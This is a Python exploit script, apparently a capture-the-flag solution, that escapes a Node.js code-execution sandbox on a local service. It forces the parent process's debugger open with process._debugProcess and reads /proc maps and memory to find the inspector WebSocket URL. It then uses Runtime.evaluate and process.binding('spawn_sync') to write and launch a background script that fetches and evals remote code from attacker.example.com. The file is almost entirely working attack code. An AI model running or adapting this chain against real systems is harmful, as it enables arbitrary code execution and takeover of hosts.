import re
import time
import httpx

with open('compile-code/out.js', 'r') as f:
    ws = f.read() + '\n'

with httpx.Client(base_url='http://localhost:3000', timeout=60.0) as client:
    def execute(code, use_ws=False):
        if use_ws:
            code = ws + code
        r = client.post('/', data={
            'code': code
        })
        return re.findall(r'<pre>(.*?)</pre>', r.text, re.MULTILINE | re.DOTALL)[0].strip()

    # 1. 親プロセスにSIGUSR1を投げて強引にデバッガを起動させる
    execute('''
const ppid = require.main.path.split('-')[1];
process._debugProcess(+ppid);
'''.strip())
    time.sleep(1)

    # 2. /proc/{pid}/下のmapsとmemを読んでWebSocketのURLを得る
    ws_uuid = execute('''
const fs = require('fs/promises');
const path = require('path');
const ppid = require.main.path.split('-')[1];
path.toNamespacedPath = (path) => { return `${__dirname}/../../proc/${ppid}/maps`; };

(async () => {
    const maps = await fs.readFile('.') + '';

    path.toNamespacedPath = (path) => { return `${__dirname}/../../proc/${ppid}/mem`; };
    const f = await fs.open('.');

    let result;
    const m = [0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    for (const line of maps.split('\\n')) {
        if (!line.includes('-')) continue;
        if (!line.includes('r')) continue;

        let [start, end] = line.split(' ')[0].split('-');
        start = parseInt(start, 16);
        end = parseInt(end, 16);
        const size = end - start;

        const buf = Buffer.alloc(size);
        try {
            await f.read(buf, 0, size, start);
        } catch {
            continue;
        }

        let j = 0;
        for (let i = 0; i < size; i++) {
            switch (m[j]) {
                case 0: if ((0x30 <= buf[i] && buf[i] <= 0x39) || (0x61 <= buf[i] && buf[i] <= 0x66)) j++; else j = 0; break;
                case 1: if (buf[i] === 0x2d) j++; else j = 0; break;
            }

            if (j === m.length) {
                result = buf.slice(i - m.length + 1, i + 1).toString();
                break;
            }
        }
    }

    console.log(result);
})();
'''.strip())
    ws_endpoint = f'ws://127.0.0.1:9229/{ws_uuid}'
    print(ws_endpoint)

    # 3. デバッガのRuntime.evaluate + process.bindingでsandbox escapeに持ち込む。手順4-6はsolve.phpに存在
    # なお、手順4以降は/proc/{pid}/memの書き換え等、別の方法でもいける気がする
    r = execute('''
const ws = new WebSocket('WS_ENDPOINT');

const code = `
setTimeout(async () => {
    process.binding('spawn_sync').spawn({
        file: '/bin/bash',
        // refer attached solve.php
        args: ['/bin/bash', '-c', 'echo "(async()=>{ const r = await fetch(' + "'http://attacker.example.com/solve.php?ws=WS_ENDPOINT'" + '); eval(await r.text()); })()" > /tmp/poyoyoyoe.js'],
        envPairs: [],
        stdio: [
            { type: 'pipe', readable: true, writable: true },
            { type: 'pipe', readable: true, writable: true },
            { type: 'pipe', readable: true, writable: true }
        ]
    });

    process.binding('spawn_sync').spawn({
        file: '/bin/bash',
        args: ['/bin/bash', '-c', '/usr/local/bin/node /tmp/poyoyoyoe.js >/dev/null 2>&1 &'],
        envPairs: [],
        stdio: [
            { type: 'pipe', readable: true, writable: true },
            { type: 'pipe', readable: true, writable: true },
            { type: 'pipe', readable: true, writable: true }
        ],
    });
}, 5000);
`;

ws.on('open', () => {
    ws.send(JSON.stringify({
        id: 1,
        method: 'Runtime.evaluate',
        params: {
            expression: code
        }
    }));
});

setTimeout(() => { ws.close(); }, 3000);
'''.replace('WS_ENDPOINT', ws_endpoint).strip(), True)

    time.sleep(10)

    # 7. 一応レスポンスが書き換わっているか確認
    r = client.get('/')
    print(r.text)

    # 8. 完了。admin botに見てもらおう